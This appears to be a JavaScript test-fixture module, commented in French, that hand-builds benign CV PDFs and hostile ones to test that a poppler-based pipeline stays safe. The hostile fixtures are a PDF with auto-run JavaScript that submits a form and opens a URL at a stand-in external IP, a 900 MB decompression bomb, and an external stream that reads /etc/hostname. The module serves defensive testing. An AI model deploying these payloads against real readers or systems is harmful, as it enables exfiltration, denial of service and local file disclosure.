/**
 * PDF de test écrits à la main (aucun outil) : légitimes et hostiles.
 * buildPdf(objects, rootIndex) assemble un PDF valide (table xref exacte).
 */
import { createDeflate } from "node:zlib";

/** Assemble un PDF : `objects` (texte ou Buffer, numérotés à partir de 1), objet racine `root`. */
export function buildPdf(objects, root = 1, header = "%PDF-1.4\n%\xe2\xe3\xcf\xd3\n") {
  const parts = [Buffer.from(header, "latin1")];
  let offset = parts[0].length;
  const offsets = [];
  objects.forEach((o, i) => {
    offsets.push(offset);
    const body = Buffer.isBuffer(o) ? o : Buffer.from(o, "latin1");
    const chunk = Buffer.concat([Buffer.from(`${i + 1} 0 obj\n`, "latin1"), body, Buffer.from("\nendobj\n", "latin1")]);
    parts.push(chunk);
    offset += chunk.length;
  });
  const xref = `xref\n0 ${objects.length + 1}\n0000000000 65535 f \n${offsets.map((o) => `${String(o).padStart(10, "0")} 00000 n \n`).join("")}`;
  parts.push(Buffer.from(`${xref}trailer\n<< /Size ${objects.length + 1} /Root ${root} 0 R >>\nstartxref\n${offset}\n%%EOF\n`, "latin1"));
  return Buffer.concat(parts);
}

const stream = (dict, data) => Buffer.concat([Buffer.from(`<< ${dict} /Length ${data.length} >>\nstream\n`, "latin1"), data, Buffer.from("\nendstream", "latin1")]);

/** CV de `pages` pages A4 : texte Helvetica (police standard NON embarquée) et un aplat. */
export function textPdf(pages = 2, { catalogExtra = "", mediaBox = "0 0 595 842" } = {}) {
  const objs = ["", "", "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"];
  const kids = [];
  for (let p = 1; p <= pages; p++) {
    const text = Buffer.from(`BT /F1 28 Tf 72 760 Td (Curriculum vitae - page ${p}) Tj ET BT /F1 14 Tf 72 720 Td (Illustration, animation, decors.) Tj ET 0.2 0.4 0.8 rg 72 600 300 60 re f`, "latin1");
    objs.push(stream("", text));
    objs.push(`<< /Type /Page /Parent 2 0 R /MediaBox [${mediaBox}] /Resources << /Font << /F1 3 0 R >> >> /Contents ${objs.length} 0 R >>`);
    kids.push(objs.length);
  }
  objs[0] = `<< /Type /Catalog /Pages 2 0 R ${catalogExtra} >>`;
  objs[1] = `<< /Type /Pages /Kids [${kids.map((k) => `${k} 0 R`).join(" ")}] /Count ${pages} >>`;
  return buildPdf(objs);
}

/** JavaScript à l'ouverture (OpenAction) et action de lien : ne doit jamais s'exécuter (poppler n'a pas de moteur JS). */
export function scriptedPdf() {
  return textPdf(1, { catalogExtra: "/OpenAction << /S /JavaScript /JS (app.alert\\('pwned'\\); this.submitForm\\('http://203.0.113.1/x'\\);) >> /Names << /JavaScript << /Names [(a) << /S /JavaScript /JS (app.launchURL\\('http://203.0.113.1/'\\)) >>] >> >>" });
}

/**
 * Bombe de décompression : une image 30000 × 30000 en niveaux de gris
 * (900 Mo décodés) dont le flux Flate ne pèse que ~0,9 Mo.
 */
export async function imageBombPdf(side = 30000) {
  // Compression en flux, ligne par ligne : jamais 900 Mo en mémoire ici.
  const z = createDeflate({ level: 9 });
  const out = [];
  z.on("data", (c) => out.push(c));
  const done = new Promise((resolve) => z.on("end", resolve));
  const row = Buffer.alloc(side, 0x80);
  for (let y = 0; y < side; y++) if (!z.write(row)) await new Promise((r) => z.once("drain", r));
  z.end();
  await done;
  const data = Buffer.concat(out);
  const content = Buffer.from("q 595 0 0 842 0 0 cm /Im1 Do Q", "latin1");
  return buildPdf([
    "<< /Type /Catalog /Pages 2 0 R >>",
    "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Resources << /XObject << /Im1 5 0 R >> >> /Contents 4 0 R >>",
    stream("", content),
    stream(`/Type /XObject /Subtype /Image /Width ${side} /Height ${side} /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode`, data),
  ]);
}

/** Flux de contenu EXTERNE (/F : spécification de fichier) : poppler ne doit rien lire hors du PDF. */
export function externalStreamPdf(target = "/etc/hostname") {
  return buildPdf([
    "<< /Type /Catalog /Pages 2 0 R >>",
    "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
    "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 595 842] /Contents 4 0 R >>",
    `<< /Length 0 /F (${target}) >>\nstream\n\nendstream`,
  ]);
}
